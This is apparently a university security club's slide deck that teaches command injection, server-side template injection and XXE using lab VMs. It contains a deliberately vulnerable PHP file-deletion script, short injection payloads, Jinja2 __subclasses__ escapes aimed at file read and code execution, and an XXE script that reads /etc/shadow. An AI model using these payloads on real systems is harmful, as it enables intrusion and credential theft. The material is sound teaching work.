# Command Injection, SSTI, XXE

By: Nick Bulischeck

CU Cyber


## You Can Find These Presentations Online

Visit [cucyber.net](https://cucyber.net/) to find these presentations and more online!

<span style="padding-top: 6em; font-size: 0.4em; float: left;">Material: <a href="https://tldrlegal.com/license/creative-commons-attribution-sharealike-4.0-international-(cc-by-sa-4.0)">Creative Commons Attribution-ShareAlike 4.0</a></span><span style="padding-top: 6em; font-size: 0.4em; float: right;">Code: <a href="https://tldrlegal.com/license/bsd-2-clause-license-(freebsd)">BSD 2-Clause</a></span>



## Command Injection


### Lab Instructions

In a terminal:
1. `telnet cmdinjection.vm.cucyber.net 1337`
2. `start`

In a browser:
1. `http://cmdinjection.vm.cucyber.net:80`


### What is Command Injection?

* Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application


### When does Command Injection occur?

* Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.


### Code Example

```PHP
<?php
print("Please specify the name of the file to delete");
print("<p>");
$file=$_GET['filename'];
system("rm $file");
?>
```


#### Code Example Exploit

* `http://127.0.0.1/delete.php?filename=bob.txt;id`


#### Command Injection Demo

Note:
* `127.0.0.1 | id`



## Server-Side Template Injection


### Lab Instructions

In a terminal:
1. `telnet ssti.vm.cucyber.net 1337`
2. `start`

In a browser:
1. `http://ssti.vm.cucyber.net:8080`


### Template Engines

* Used by web applications to present dynamic data via web pages and emails


#### Template Engines

|Engine|Language|
|:----:|:------:|
|Jinja2|Python|
|Tornado|Python|
|Mako|Python|
|Marko|Javascript|
|Pug|Javascript|
|EJS|Javascript|
|Smart|PHP|


### What is Server-Side Template Injection?

* Unsafely embedding user input in templates
* Commonly confused with Cross-Site Scripting
* Often used to leak private configuration information
* Even worse, likely leads to Remote Code Execution

Note:
https://hackerone.com/reports/125980


### What does SSTI look like?


### Jinja2 Page Rendering

```Python
@app.errorhandler(404)
def page_not_found(e):
    template = '''{  extends "layout.html"  }
{  block body  }
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div>
{  endblock  }
''' % (request.url)
    return render_template_string(template), 404
```


#### SSTI Discovery

![SSTI Flask 1](ssti_flask_1.png)

Note:
Did you notice that the input we supplied ("invalid") is in the page?


#### SSTI Discovery

![SSTI Flask 2](ssti_flask_2.png)

Note:
Is this cross-site scripting? or something more?


#### SSTI Discovery

![SSTI Flask 3](ssti_flask_3.png)

Note:
Why does it say "invalid14" instead of "invalid{{7+7}}"?


### Python Internals


#### __mro__

* Method Resolution Order
* A tuple of classes that are considered when looking for base classes during method resolution
* The `__mro__` attribute consists of the object’s inheritance map
* Inheritance map is a  tuple consisting of the class, its base, its base’s base, etc.


#### Subclasses()

* A method that keeps a list of weak references to its immediate subclasse for each class, and returns a list of all those references still alive.


#### In Summary

* Go up with `__mro__` or `mro()`
* Go down with `__subclasses__()`

Note:
* In python `__mro__` or mro() allows us to go back up the tree of inherited objects in the current Python environment, and `__subclasses__()` lets us come back down.
* Basically, you can crawl up the inheritance tree of the known objects using mro, thus accessing every class loaded in the current python environment (!).


### Using MRO and Subclasses

* `{{''.class.mro()[1].__subclasses__()}}`

Note:
Show this in a python terminal and have people try it on the webapp.


#### How does this help?

* `<type 'file'>`
 - Arbitrary file read
* `<class 'subprocess'>`
 - Remote code execution


### Common SSTI Attacks

* `{{ config.items() }}`
* `{{ ''.class.mro()[1].__subclasses__()[obj_num_here](function) }}`


### Automated SSTI Attacks

* [Tplmap](https://github.com/epinna/tplmap/)
* [Tplmap-Burp](https://github.com/epinna/tplmap/blob/master/burp_extension/README.md)



## External XML Entity Injection


### Lab Instructions

In a terminal:
1. `telnet xxe.vm.cucyber.net 1337`
2. `start`

In a browser:
1. `http://xxe.vm.cucyber.net:8080`


### What is External XML Entity Injection?

* An XML External Entity (XXE) attack is a type of attack against an application that parses XML input


### When does XXE occur?

* This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.


### Identifying XXE

* The application parses XML documents.
* Tainted data is allowed within the system identifier portion of the entity, within the document type declaration (DTD).
* The XML processor is configured to validate and process the DTD.
* The XML processor is configured to resolve external entities within the DTD.


### What can you do with XXE?

* Attacks can include disclosing local files
* Denial of Service
* Pivot to other internal systems


### XXE Attack Example


#### Vulnerable Code

```Javascript
<?xml version="1.0" encoding="ISO-8859-1"?>
<person>
	<firstname> + firstname + </firstname>
	<lastname> + lastname + </lastname>
</person>
```


#### XXE Attack

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE formname [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
```


#### XXE Demo

Note:
```Python
import requests
xml = '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE person [<!ENTITY file SYSTEM "file:///etc/shadow" >]><person><firstname>lol</firstname><lastname>&file;</lastname></person>'''
r = requests.post("http://10.13.37.5", data={'data' : xml})
print(r.text)
```
